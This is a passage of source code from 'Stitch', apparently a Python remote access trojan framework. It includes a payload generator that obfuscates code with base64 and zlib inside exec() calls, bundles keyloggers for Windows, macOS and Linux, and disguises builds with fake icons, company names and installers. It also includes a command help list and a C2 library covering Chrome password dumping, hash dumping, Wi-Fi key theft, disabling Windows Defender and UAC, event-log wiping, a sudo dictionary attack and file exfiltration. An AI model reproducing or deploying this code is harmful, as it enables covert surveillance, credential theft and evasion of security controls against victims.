################################################################################

    def complete_cat(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, all_dir=True)

    def complete_cd(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, dir_only = True)

    def complete_dir(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, dir_only = True)

    def complete_ls(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, dir_only = True)

    def complete_more(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, all_dir=True)

    def complete_start(self, text, line, begidx, endidx):
        return find_path(text, line, begidx, endidx, all_dir=True)

    def complete_shell(self, text, line, begidx, endidx):
        return find_completion(text,self.inf_sock)

################################################################################
#                        Start of HELP Section                                 #
################################################################################

    def help_addkey(self): st_help_addkey()

    def help_cat(self): st_help_cat()

    def help_cd(self): st_help_cd()

    def help_cls(self): st_help_cls()

    def help_clear(self): st_help_clear()

    def help_connect(self): st_help_connect()

    def help_dir(self): st_help_dir()

    def help_history(self): st_help_history()

    def help_history_remove(self): st_help_history_remove()

    def help_home(self): st_help_home()

    def help_ifconfig(self): st_help_ifconfig()

    def help_ipconfig(self): st_help_ipconfig()

    def help_lsmod(self): st_help_lsmod()

    def help_ls(self): st_help_ls()

    def help_listen(self): st_help_listen()

    def help_more(self): st_help_more()

    def help_pwd(self): st_help_pwd()

    def help_ps(self): st_help_ps()

    def help_start(self): st_help_start()

    def help_sessions(self): st_help_sessions()

    def help_shell(self): st_help_shell()

    def help_showkey(self): st_help_showkey()

    def help_stitchgen(self): st_help_stitchgen()

    def help_touch(self): st_help_touch()

    def help_exit(self): st_help_exit()

    def help_EOF(self): st_help_EOF()


def server_main():
    try:
        st_log.info('Starting Stitch')
        st = stitch_server()
        st.do_listen('4040')
        st.cmdloop()
    except KeyboardInterrupt:
        st_log.info("Exiting Stitch due to a KeyboardInterrupt")
        st.do_exit()
    except Exception as e:
        st_log.info("Exiting Stitch due to an exception:\n{}".format(str(e)))
        st_print("[!] {}\n".format(str(e)))
        st.do_exit()


if __name__ == "__main__":
    server_main()

```

`Application/stitch_gen.py`:

```py
# -*- coding: utf-8 -*-
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

from stitch_utils import *
from stitch_pyld_config import *

from Stitch_Vars.nsis import *
from Stitch_Vars.makeself import *
from Stitch_Vars.payload_code import *
from Stitch_Vars.payload_setup import *

if windows_client():
    import py2exe
    from distutils.core import setup

def assemble_stitch():
    global utils_imports,utils_code

    stini = stitch_ini()
    BIND = stini.get_bool("BIND")
    BHOST = stini.get_value("BHOST")
    BPORT = stini.get_value("BPORT")

    LISTEN = stini.get_bool("LISTEN")
    LHOST = stini.get_value("LHOST")
    LPORT = stini.get_value("LPORT")

    EMAIL = stini.get_value("EMAIL")
    EMAIL_PWD = base64.b64decode(stini.get_value("EMAIL_PWD"))
    KEYLOGGER_BOOT = stini.get_bool("KEYLOGGER_BOOT")

    main_code = ''
    if BIND:
        BHOST = base64.b64encode(BHOST)
        BPORT = base64.b64encode(BPORT)
        main_code += add_bind_server(BHOST,BPORT)
    if LISTEN:
        LHOST = base64.b64encode(LHOST)
        LPORT = base64.b64encode(LPORT)
        main_code += add_listen_server(LHOST,LPORT)

    if LISTEN and BIND:
        main_code += add_listen_bind_main()
    elif LISTEN:
        main_code += add_listen_main()
    elif BIND:
        main_code += add_bind_main()
    main_code += add_run_main()

    required_imports = get_requirements()

    if windows_client():
        utils_imports    += win_util_imports()
        required_imports += win_util_imports()
        utils_code += win_reg_exists()
    elif osx_client():
        utils_imports    += osx_util_imports()
        required_imports += osx_util_imports()
    else:
        utils_imports    += lnx_util_imports()
        required_imports += lnx_util_imports()
    if KEYLOGGER_BOOT:
        utils_code +=  'nt_kl.start()\n'
    if EMAIL != 'None' and EMAIL_PWD:
        utils_code += get_email(EMAIL, EMAIL_PWD)
        required_imports += email_imports()

    st_main       = main_imports + main_code
    st_utils      = utils_imports + utils_code
    st_protocol   = get_protocol()
    st_encryption = get_encryption()
    st_win_kl     = get_win_keylogger()
    st_osx_kl     = get_osx_keylogger()
    st_lnx_kl     = get_lnx_keylogger()

    st_main       = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_main)))
    st_utils      = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_utils)))
    st_protocol   = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_protocol)))
    st_encryption = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_encryption)))
    st_win_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_win_kl)))
    st_osx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_osx_kl)))
    st_lnx_kl     = 'from requirements import *\n\nexec(SEC(INFO("{}")))'.format(base64.b64encode(zlib.compress(st_lnx_kl)))

    main_script   = os.path.join(configuration_path,'st_main.py')
    utils_script  = os.path.join(configuration_path,'st_utils.py')
    proto_script  = os.path.join(configuration_path,'st_protocol.py')
    reqmnt_script = os.path.join(configuration_path, 'requirements.py')
    encry_script  = os.path.join(configuration_path,'st_encryption.py')
    win_keylg_script  = os.path.join(configuration_path,'st_win_keylogger.py')
    osx_keylg_script  = os.path.join(configuration_path,'st_osx_keylogger.py')
    lnx_keylg_script  = os.path.join(configuration_path,'st_lnx_keylogger.py')

    with open(main_script,'wb') as m:
        m.write(st_main)
    with open(utils_script,'wb') as u:
        u.write(st_utils)
    with open(proto_script,'wb') as m:
        m.write(st_protocol)
    with open(encry_script,'wb') as m:
        m.write(st_encryption)
    with open(reqmnt_script,'wb') as u:
        u.write(required_imports)
    with open(win_keylg_script,'wb') as u:
        u.write(st_win_kl)
    with open(osx_keylg_script,'wb') as u:
        u.write(st_osx_kl)
    with open(lnx_keylg_script,'wb') as u:
        u.write(st_lnx_kl)

    st_print("[+] Stitch Modules are now complete.")

def win_gen_payload(dist_dir,icon, dest, cpyr, cmpny, ver, name, desc):

    sys.argv.append('py2exe')

    setup(
        options = {'py2exe': {'bundle_files': 1,
                    'compressed': True,
                    'ascii': False,
                    'dll_excludes':['msvcr71.dll',"tcl85.dll","tk85.dll","QtCore4.dll","QtGui4.dll", "IPHLPAPI.DLL", "NSI.dll",  "WINNSI.DLL",  "WTSAPI32.dll"],
                    'dist_dir':dist_dir,
                    'excludes':['PyQt4','PyQt5','Tkconstants', 'Tkinter']}},


        windows = [{
            "script":'st_main.py',
            "icon_resources": [(1, icon)],
            "dest_base" : dest,
            'copyright': cpyr,
            'company_name': cmpny,
            }],
        zipfile = None,
        version = ver,
        name = name,
        description = desc,
    )
    del sys.argv[-1]

def posix_gen_payload(name,dist_dir,icon=None):
    #
    #add the osx/linux pyinstaller spec information
    #
    if osx_client():
        st_spec = '''
# -*- mode: python -*-

block_cipher = None


a = Analysis(['st_main.py'],
             pathex=['{}'],
             binaries=None,
             datas=None,
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='{}',
          debug=False,
          strip=False,
          upx=True,
          console=False )
app = BUNDLE(exe,
             name='{}.app',
             icon="{}",
             bundle_identifier=None,
             info_plist={{'LSUIElement':'True'}},
            )'''.format(os.getcwd(),name,name,icon)
    else:
        st_spec = '''
# -*- mode: python -*-

block_cipher = None


a = Analysis(['st_main.py'],
             pathex=['{}'],
             binaries=None,
             datas=None,
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='{}',
          debug=False,
          strip=False,
          upx=True,
          console=False )'''.format(os.getcwd(),name)

    with open('st_main.spec','w') as st:
        st.write(st_spec)
    st_log.info(run_command('pyinstaller --onefile --distpath={} st_main.spec'.format(dist_dir)))

    binary = os.path.join(dist_dir,name)
    binary_dir = os.path.join(dist_dir,'Binaries')
    if not os.path.exists(binary_dir):
        os.makedirs(binary_dir)
    if os.path.exists(binary):
        shutil.copy(binary,binary_dir)
        os.remove(binary)
    else:
        st_log.error('{} was not created from command "pyinstaller --onefile --distpath={} st_main.spec"'.format(binary,dist_dir))

def run_exe_gen():
    if not os.path.exists(st_config):
        gen_default_st_config()

    if confirm_config():
        conf_dir = get_conf_dir()
        assemble_stitch()

        #TODO Make OS specific builds windows/linux/os x
        st_print("[*] Starting exe generation...\n")
        cur_dir = os.getcwd()
        if windows_client():
            os.chdir(configuration_path)
            win_progress = progress_bar(len(win_payload_list))
            win_progress.display()
            for alias in win_payload_list:
                retry = 0
                #st_print("[*] Creating payload with {} configuration...".format(alias))
                while True:
                    try:
                        with nostdout():
                            win_gen_payload(conf_dir,win_payload_Icons[alias],alias,nsis_LegalCopyright[alias],
                                    nsis_CompanyName[alias],nsis_Version[alias],win_payload_Name[alias],win_payload_Description[alias])
                        break
                    except Exception as e:
                        print e
                        retry += 1
                        if retry > 3:
                            st_print('[*] Failed more than three times. Moving on to next configuration')
                            break
                        pass
                win_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
            win_progress.complete()
            st_print("[+] Exe generation is complete.")

            nsis_creation = raw_input("\nWould you like to create NSIS Installers for your payloads? [y/n]: ")
            if nsis_creation.lower().startswith('y'):
                if os.path.exists("C:\\Program Files (x86)\\NSIS\\makensis.exe"):
                    st_print("[*] Creating NSIS Installers...\n")
                    win_progress = progress_bar(len(win_payload_list))
                    win_progress.display()
                    for alias in win_payload_list:
                        #st_print("[*] Creating NSIS installer for {} configured payload...".format(alias))
                        path = nsis_Path[alias]
                        outfile = nsis_ProductName[alias]
                        gen_nsis(conf_dir,alias,outfile,path,elevation_path)
                        win_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
                    win_progress.complete()
                else:
                    st_print('[!] "C:\\Program Files (x86)\\NSIS\\makensis.exe" does not exist.')
                    st_print('[*] To install NSIS go to: "http://nsis.sourceforge.net/Download"')
        elif osx_client():
            osx_progress = progress_bar(len(osx_payload_list))
            osx_progress.display()
            for alias in osx_payload_list:
                posix_gen_payload(alias,conf_dir,icon=osx_payload_Icons[alias])
                osx_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
            osx_progress.complete()

            mkself_creation = raw_input("\nWould you like to create Makeself Installers for your payloads? [y/n]: ")
            if mkself_creation.lower().startswith('y'):
                st_print("[*] Creating Makeself Installers...\n")
                osx_progress = progress_bar(len(osx_payload_list))
                osx_progress.display()
                for alias in osx_payload_list:
                    gen_makeself(conf_dir,alias)
                    osx_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
                osx_progress.complete()
        else:
            lnx_progress = progress_bar(len(lnx_payload_list))
            lnx_progress.display()
            for alias in lnx_payload_list:
                posix_gen_payload(alias,conf_dir)
                lnx_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
            lnx_progress.complete()

            mkself_creation = raw_input("\nWould you like to create Makeself Installers for your payloads? [y/n]: ")
            if mkself_creation.lower().startswith('y'):
                st_print("[*] Creating Makeself Installers...\n")
                lnx_progress = progress_bar(len(lnx_payload_list))
                lnx_progress.display()
                for alias in lnx_payload_list:
                    gen_makeself(conf_dir,alias)
                    lnx_progress.increment(inc_track=1, inc_prog=1, file_inc=False)
                lnx_progress.complete()

        os.chdir(cur_dir)
        if os.path.exists(os.path.join(conf_dir,'w9xpopen.exe')):
            if windows_client():
                run_command('del {}'.format(os.path.join(conf_dir,'w9xpopen.exe')))
            else:
                run_command('rm -f {}'.format(os.path.join(conf_dir,'w9xpopen.exe')))
        st_print('[+] Payload creation is complete: {}\n'.format(conf_dir))

```

`Application/stitch_help.py`:

```py
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

from stitch_utils import st_print

################################################################################
#                        Start of USAGE Section                                #
################################################################################

def usage_addkey(): st_print('[*] Usage: addkey [encrypted AES key]\n')

def usage_askpassword(): st_print('[*] Usage: askPassword\n')

def usage_avscan(): st_print('[*] Usage: avscan\n')

def usage_cat(): st_print('[*] Usage: cat [path]\n')

def usage_cd(): st_print('[*] Usage: cd [path]\n')

def usage_chromedump(): st_print('[*] Usage: chromedump\n')

def usage_cls(): st_print('[*] Usage: cls\n')

def usage_clear(): st_print('[*] Usage: clear\n')

def usage_clearev(): st_print('[*] Usage: clearev\n')

def usage_connect(): st_print("[*] Usage: connect [target] [port]\n")

def usage_crackpassword(): st_print('[*] Usage: crackpassword\n')

def usage_dir(): st_print('[*] Usage: dir\n')

def usage_disableRDP(): st_print('[*] Usage: disableRDP\n')

def usage_disableUAC(): st_print('[*] Usage: disableUAC\n')

def usage_disableWindef(): st_print('[*] Usage: disableWindef\n')

def usage_displayoff(): st_print('[*] Usage: displayoff\n')

def usage_displayon(): st_print('[*] Usage: displayon\n')

def usage_download(): st_print("[*] Usage: download [path]\n")

def usage_drives(): st_print('[*] Usage: drives\n')

def usage_editaccessed(): st_print('[*] Usage: editaccessed [path]\n')

def usage_editcreated(): st_print('[*] Usage: editcreated [path]\n')

def usage_editmodified(): st_print('[*] Usage: editmodified [path]\n')

def usage_enableRDP(): st_print('[*] Usage: enableRDP\n')

def usage_enableUAC(): st_print('[*] Usage: enableUAC\n')

def usage_enableWindef(): st_print('[*] Usage: enableWindef\n')

def usage_environment(): st_print('[*] Usage: environment\n')

def usage_fileinfo(): st_print('[*] Usage: fileinfo [path]\n')

def usage_firewall(): st_print('[*] Usage: firewall status\n[*] Usage: firewall [open/close] [port] [in/out] [tcp/udp]\n')

def usage_freeze(): st_print('[*] Usage: freeze [status/start/stop]\n')

def usage_hashdump(): st_print('[*] Usage: hashdump\n')

def usage_hide(): st_print('[*] Usage: hide [file/dir]\n')

def usage_history(): st_print('[*] Usage: history\n')

def usage_history_remove(): st_print('[*] Usage: history_remove [target]\n')

def usage_home(): st_print('[*] Usage: home\n')

def usage_hostsfile(): st_print('[*] Usage: hostsfile [update/remove/show]\n')

def usage_ifconfig(): st_print('[*] Usage: ifconfig\n')

def usage_ipconfig(): st_print('[*] Usage: ipconfig\n')

def usage_keylogger(): st_print('[*] Usage: keylogger [status/start/stop/dump]\n')

def usage_location(): st_print('[*] Usage: location\n')

def usage_lockscreen(): st_print('[*] Usage: lockscreen\n')

def usage_logintext(): st_print('[*] Usage: logintext\n')

def usage_lsmod(): st_print('[*] Usage: lsmod\n')

def usage_ls(): st_print('[*] Usage: ls\n')

def usage_listen(): st_print('[*] Usage: listen [port]\n')

def usage_more(): st_print('[*] Usage: more [path]\n')

def usage_popup(): st_print('[*] Usage: popup\n')

def usage_pwd(): st_print('[*] Usage: pwd\n')

def usage_ps(): st_print('[*] Usage: ps\n')

def usage_pyexec(): st_print("[*] Usage: pyexec [python script]\n")

def usage_scanreg(): st_print('[*] Usage: scanreg\n')

def usage_screenshot(): st_print('[*] Usage: screenshot\n')

def usage_sessions(): st_print('[*] Usage: sessions\n')

def usage_shell(): st_print('[*] Usage: shell [session]\n')

def usage_showkey(): st_print('[*] Usage: showkey\n')

def usage_ssh(): st_print('[*] Usage: ssh\n')

def usage_start(): st_print('[*] Usage: run [path]\n')

def usage_stitchgen(): st_print('[*] Usage: stitch_gen\n')

def usage_sudo(): st_print('[*] Usage: sudo [command]\n')

def usage_sysinfo(): st_print('[*] Usage: sysinfo\n')

def usage_touch(): st_print('[*] Usage: touch [path]\n')

def usage_unhide(): st_print('[*] Usage: unhide [file/dir]\n')

def usage_upload(): st_print("[*] Usage: upload [file/dir]\n")

def usage_vmscan(): st_print('[*] Usage: vmscan\n')

def usage_webcamsnap(): st_print('[*] Usage: webcamsnap [device]\n')

def usage_webcamlist(): st_print('[*] Usage: webcamlist\n')

def usage_wifikeys(): st_print("[*] Usage: wifikeys\n")

def usage_exit(): st_print('[*] Usage: exit\n')

################################################################################
#                        Start of HELP Section                                 #
################################################################################

def st_help_addkey():
    st_print("[*] Adds an AES key to the library; allowing communication with "\
             "Stitch payloads which use that encryption key.")
    usage_addkey()

def st_help_askpassword():
    st_print("[*] Displays security password prompt and returns user's input.")
    usage_askpassword()

def st_help_avscan():
    st_print('[*] Scans and lists possible Antiviruses installed.')
    usage_avscan()

def st_help_avkill():
    st_print('[*] Attempts to terminate detected Antiviruses running.')
    usage_avkill()

def st_help_cat():
    st_print('[*] Displays content of the file.')
    usage_cat()

def st_help_cd():
    st_print('[*] Displays the name of or changes the current directory.')
    usage_cd()

def st_help_chromedump():
    st_print('[*] Retrieves all passwords stored by Chrome.')
    usage_chromedump()

def st_help_cls():
    st_print('[*] Clears the screen.')
    usage_cls()

def st_help_clear():
    st_print('[*] Clears the screen.')
    usage_clear()

def st_help_clearev():
    st_print('[*] Clears System, Security, and Application event logs on a Windows machine.')
    usage_clearev()

def st_help_connect():
    st_print('[*] Attempts to connect to a server running a stitch payload.')
    usage_connect()

def st_help_crackpassword():
    st_print('[*] Attempts to crack the sudo password by using a dictionary attack.')
    usage_crackpassword()

def st_help_dir():
    st_print('[*] Displays a list of files and subdirectories in a directory.')
    usage_dir()

def st_help_disableRDP():
    st_print('[*] Disables Remote Desktop Protocol feature.')
    usage_disableRDP()

def st_help_disableUAC():
    st_print('[*] Disables the User Account Control feature.')
    usage_disableUAC()

def st_help_disableWindef():
    st_print('[*] Disables Windows Defender.')
    usage_disableWindef()

def st_help_displayoff():
    st_print("[*] Turns off the display monitors.")
    usage_displayoff()

def st_help_displayon():
    st_print("[*] Turns on the display monitors.")
    usage_displayon()

def st_help_download():
    st_print('[*] Downloads the specified file/dir to the Stitch Downloads folder.')
    usage_download()

def st_help_drives():
    st_print('[*] Displays info of all drives on the system.')
    usage_drives()

def st_help_editaccessed():
    st_print('[*] Edits the "Accessed" date of a file.')
    usage_editaccessed()

def st_help_editcreated():
    st_print('[*] Edits the "Created" date of a file')
    usage_editcreated()

def st_help_editmodified():
    st_print('[*] Edits the "Modified" date of a file.')
    usage_editmodified()

def st_help_enableRDP():
    st_print('[*] Enables Remote Desktop Protocol feature.')
    usage_enableRDP()

def st_help_enableUAC():
    st_print('[*] Enables the User Account Control feature.')
    usage_enableUAC()

def st_help_enableWindef():
    st_print('[*] Enables Windows Defender.')
    usage_enableWindef()

def st_help_environment():
    st_print("[*] Displays the system's environment variables.")
    usage_environment()

def st_help_fileinfo():
    st_print('[*] Disaplys file information.')
    usage_fileinfo()

def st_help_firewall():
    st_print('[*] Displays firewall status, open/close ports, or allow a program.')
    usage_firewall()

def st_help_freeze():
    st_print("[*] Freezes the mouse and keyboard of the system. Allowing you to start/stop and view the status.")
    usage_freeze()

def st_help_hashdump():
    st_print('[*] Grabs the password hashes stored on the system.')
    usage_hashdump()

def st_help_hide():
    st_print('[*] Hides the specified file/dir from the user.')
    usage_hide()

def st_help_history():
    st_print('[*] Displays information of past shell connections.')
    usage_history()

def st_help_history_remove():
    st_print('[*] Removes the system from your history.')
    usage_history_remove()

def st_help_home():
    st_print('[*] Clears the screen and displays the Stitch banner.')
    usage_home()

def st_help_hostsfile():
    st_print("[*] Updates, removes, or shows desired hostname and IP address from the system's hosts file.")
    usage_hostsfile()

def st_help_ifconfig():
    st_print("[*] Displays the system's IP configuration.")
    usage_ifconfig()

def st_help_ipconfig():
    st_print("[*] Displays the system's IP configuration.")
    usage_ipconfig()

def st_help_keylogger():
    st_print("[*] Records keystrokes of the user. Allowing you to view the status, start, stop, and dump the keystokes to screen.")
    usage_keylogger()

def st_help_location():
    st_print("[*] Gives public IP and estimate geo location of the system.")
    usage_location()

def st_help_lockscreen():
    st_print("[*] Enters the system's lock screen.")
    usage_lockscreen()

def st_help_logintext():
    st_print("[*] Sets the text of the system's login screen.")
    usage_logintext()

def st_help_ls():
    st_print('[*] Displays a list of files and subdirectories in a directory.')
    usage_ls()

def st_help_lsmod():
    st_print('[*] Displays list of all installed drivers.')
    usage_lsmod()

def st_help_listen():
    st_print('[*] Server binds to given port to listen for connections.')
    usage_listen()

def st_help_more():
    st_print('[*] Displays ouput of file path.')
    usage_more()

def st_help_popup():
    st_print("[*] Displays popup box with custom message.")
    usage_popup()

def st_help_pwd():
    st_print('[*] Displays the name of the current directory.')
    usage_pwd()

def st_help_pyexec():
    st_print('[*] Runs python script on the system.')
    usage_pyexec()

def st_help_ps():
    st_print('[*] Displays list of all running processes.')
    usage_ps()

def st_help_scanreg():
    st_print('[*] Display information on Windows Registry.')
    usage_scanreg()

def st_help_screenshot():
    st_print('[*] Takes a screenshot of the screen.')
    usage_screenshot()

def st_help_sessions():
    st_print('[*] Displays machines available for exploitation.')
    usage_sessions()

def st_help_shell():
    st_print('[*] Opens a shell prompt of the requested session.')
    usage_shell()

def st_help_showkey():
    st_print('[*] Displays the active encrypted AES key used for payload creation.')
    usage_showkey()

def st_help_ssh():
    st_print('[*] Attempts to open a ssh connection to the requested host.')
    usage_ssh()

def st_help_start():
    st_print('[*] Starts the desired file.')
    usage_start()

def st_help_stitchgen():
    st_print('[*] Generates stitch payloads based on running OS.')
    usage_stitchgen()

def st_help_sudo():
    st_print("[*] Runs the preceding command with admin priveleges.")
    usage_sudo()

def st_help_sysinfo():
    st_print('[*] Displays system information.')
    usage_sysinfo()

def st_help_touch():
    st_print('[*] Creates a file with no contents.')
    usage_touch()

def st_help_unhide():
    st_print('[*] Unhides the specified file/dir from the user.')
    usage_unhide()

def st_help_upload():
    st_print('[*] Uploads a file/dir to the system.')
    usage_upload()

def st_help_vmscan():
    st_print('[*] Detects if the system is a virtual machine.')
    usage_vmscan()

def st_help_webcamsnap():
    st_print('[*] Takes and downloads a picture using a connected webcamera.')
    usage_webcamsnap()

def st_help_webcamlist():
    st_print('[*] Displays list of connected webcameras.')
    usage_webcamlist()

def st_help_wifikeys():
    st_print('[*] Displays all saved wifi passwords on the system.')
    usage_wifikeys()

def st_help_exit():
    st_print('[*] Exits Stitch.')
    usage_exit()

def st_help_EOF():
    st_print('[*] Exits Stitch.')
    usage_exit()

```

`Application/stitch_lib.py`:

```py
#!/usr/bin/env python
# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

from stitch_help import *
from stitch_utils import *

def st_recvall(client, count, aes_enc=None, encryption=True):
    buf = b''
    while count:
        newbuf = client.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    if not encryption:
        return buf
    else:
        return decrypt(buf, aes_enc)

def st_receive(client,aes_enc):
    full_response = ""
    while True:
        lengthbuf = st_recvall(client, 4, encryption=False)
        length, = struct.unpack('!i', lengthbuf)
        response = st_recvall(client, length, aes_enc)
        if response != st_eof:
            full_response += response
        else:
            break
    return full_response

def st_send(client, data, aes_enc):
    while data:
        cmd = encrypt(data[:1024], aes_enc)
        length = len(cmd)
        client.sendall(struct.pack('!i', length))
        client.sendall(cmd)
        data = data[1024:]
    eof = encrypt(st_eof, aes_enc)
    eof_len = len(eof)
    client.sendall(struct.pack('!i', eof_len))
    client.sendall(eof)

class stitch_commands_library:
    __slots__= ['client', 'cli_target', 'cli_port', 'cli_os','cli_platform',
                'cli_hostname', 'cli_user', 'cli_dwld', 'cli_temp',]

    def __init__(self, client, target, port, aes_key, os, platform, hostname, user, dwld, temp):
        self.client = client
        self.cli_target = target
        self.cli_port = port
        self.aes_key = aes_key
        self.cli_os = os
        self.cli_platform = platform
        self.cli_hostname = hostname
        self.cli_user = user
        self.cli_dwld = dwld
        self.cli_temp = temp
        if self.cli_os.startswith('win'):
            self.cli_hosts_file = 'C:\\Windows\\System32\\drivers\\etc\\hosts'
        else:
            self.cli_hosts_file = '/etc/hosts'

    def history_check(self):
        self.Config = ConfigParser.ConfigParser()
        self.Config.read(hist_ini)
        self.cfgfile = open(hist_ini,'wb')
        if self.cli_target not in self.Config.sections():
            self.Config.add_section(self.cli_target)
            st_log.info('Connected to {} for the very first time'.format(self.cli_target))
        self.Config.set(self.cli_target,'port',self.cli_port)
        self.Config.set(self.cli_target,'user', self.cli_user)
        self.Config.set(self.cli_target,'os',self.cli_platform)
        self.Config.set(self.cli_target,'hostname', self.cli_hostname)
        self.Config.write(self.cfgfile)
        self.cfgfile.close()
        if not os.path.exists(os.path.join(downloads_path, self.cli_target)):
            os.mkdir(os.path.join(downloads_path, self.cli_target))

    def is_alive(self, line):
        if not line.startswith('cls') and not line.startswith('clear'):
            try:
                self.send('echo hello')
                self.receive()
            except Exception as e:
                st_print("[!] Connection has been lost.")
                st_log.error('Exception:\n{}'.format(str(e)))
                return False
        return True

    def receive(self): return st_receive(self.client,self.aes_key)

    def send(self, data): return st_send(self.client,data,self.aes_key)

################################################################################
#                        Start of COMMON LIB Section                           #
################################################################################

    def avscan(self):
        st_print("=== Antivirus Scan ===")
        if windows_client(system=self.cli_os):
            self.pyexec('avscan_win.py',pylib=True)
            st_print("    {}".format(self.receive()))
            st_print("    {}".format(self.receive()))
        else:
            self.pyexec('avscan_posix.py',pylib=True)
            st_print("    {}".format(self.receive()))

    def avkill(self):
        self.pyexec('avkiller.py',pylib=True)
        st_print(self.receive())

    def cat(self, f_name):
        self.pyexec('cat.py',pylib=True)
        self.send(f_name)
        response = ''
        response=self.receive()
        if no_error(response):
            response=self.receive()
            print '\n{}'.format(response),
            while response != st_complete:
                response=self.receive()
                if response != st_complete:
                    print '\b'+ response,
                else:
                    print "\n"
                    break
        else:
            st_print(response)

    def cd(self, path):
        if path:
            self.pyexec('cd.py',pylib=True)
            self.send(path)
            response=self.receive()
            if not no_error(response):
                st_print(response)
            else:
                print
        else:
            self.pwd()

    def clear(self):
        clear_screen()
        st_print('[+] Current Session: {}\n\n'.format(self.cli_target))

    def crackpassword(self):
        with open(os.path.join(tools_path, 'passwords.txt'),'r') as pw:
            password_list = pw.readlines()
        cracked = False
        self.pyexec('crackpassword.py',pylib=True)
        st_print('[*] Attempting to crack the sudo password...')
        for n in password_list:
            n = n.strip()
            resp = self.receive()
            if 'sudo_failed' in resp:
                st_print('[*] Currently running with sudo privileges, unable to start dictionary attack.\n')
                return
            if 'sudo_success' in resp:
                self.send(n)
                resp = self.receive()
                if 'password_failed' in resp:
                    st_print('[-] {}'.format(n))
                if 'password_cracked' in resp:
                    st_print('[+] Password: {}'.format(n))
                    st_logger(n,self.cli_dwld,'sudo_password')
                    cracked = True
                    break
        if not cracked:
            resp = self.receive()
            self.send('password_list_failed')
            st_print('[!] Failed to crack the sudo password.\n')


    def displayoff(self):
        self.pyexec('displayoff.py',pylib=True)
        st_print(self.receive())

    def displayon(self):
        self.pyexec('displayon.py',pylib=True)
        st_print(self.receive())

    def download(self, f_name):
        self.pyexec('download.py',pylib=True)
        dwld = f_name.split()
        dwld_contents = ''
        d_file = ''
        d = ''
        if not os.path.exists(self.cli_dwld):
            os.mkdir(self.cli_dwld)
        if len(dwld) > 0:
            st_print('[*] Beginning download of {}...'.format(f_name))
            if f_name.endswith('\\') or f_name.endswith('/'):
                d_file = f_name[:-1]
                d_file = os.path.basename(d_file)
                if not d_file:
                    d_file = f_name[:-1]
            else:
                d_file = os.path.basename(f_name)
                if not d_file:
                    d_file = f_name
            d_file = d_file.replace('\\','').replace('/','')
            if '.' in d_file and not d_file.startswith('.'):
                extension = d_file.index('.')
                d_file = d_file[:extension]
            d_zip = "{}-{}.zip".format(self.cli_user,d_file)
            downld = os.path.join(self.cli_dwld,d_zip)
            i = 1
            while os.path.exists(downld):
                d_zip = "{}-{} ({}).zip".format(self.cli_user,d_file,i)
                downld = os.path.join(self.cli_dwld,d_zip)
                i += 1
            self.send(f_name)
            size = self.receive()
            if no_error(size):
                if check_int(size):
                    download_bar = progress_bar(size)
                    download_bar.file_info()
                    with open(downld,'wb') as my_download:
                        while d != 'download complete':
                            d = self.receive()
                            if not no_error(d):
                                self.send('exit')
                                st_print('[!] %s\n' %d)
                                return
                            download_bar.increment()
                            if d != 'download complete':
                                my_download.write(d)
                            else:
                                download_bar.complete()
                    st_print("[+] Download succesful: %s\n" % downld)
                else:
                    st_print('[!] Size of "{}" is not a valid int'.format(size))
            else:
                st_print(size)
        else:
            st_print('[*] Download usage: [download] [filepath]\n')

    def environment(self):
        self.pyexec('environment.py',pylib=True)
        st_print("=== System Environment Variables ===")
        st_print(self.receive())

    def fileinfo(self, f_name):
        if f_name:
            self.pyexec('fileinfo.py',pylib=True)
            self.send(f_name)
            st_print(self.receive())

    def firewall(self, option):
        if option == 'status':
            self.pyexec('fwstatus.py',pylib=True)
            st_print(self.receive())
        elif option == 'open':
            try:
                while True:
                    port = raw_input("\nEnter the desired port: ",)
                    proto = raw_input("Enter desired type [TCP/UDP]: ",)
                    if windows_client(self.cli_os):
                        direction = raw_input("Enter desired direction [IN/OUT]: ",)
                    correct = raw_input("\nOpen {} Port {} going {}? [Y/N]: ".format(proto,port,direction),)
                    if correct.lower().startswith('y'):
                        break
            except KeyboardInterrupt:
                print '\n'
                return
            if windows_client(self.cli_os):
                cmd = 'netsh advfirewall firewall add rule name="NetBios Port {} {}" dir={} action=allow protocol={} localport={}'.format(port,direction,direction,proto,port)
            if osx_client(self.cli_os):
                cmd = "sed -i '' -e '$a\pass in proto {} from any to any port = {}' /etc/pf.conf; pfctl -vnf /etc/pf.conf".format(proto,port)
            self.send(cmd)
            st_print(self.receive())
        elif option == 'close':
            try:
                while True:
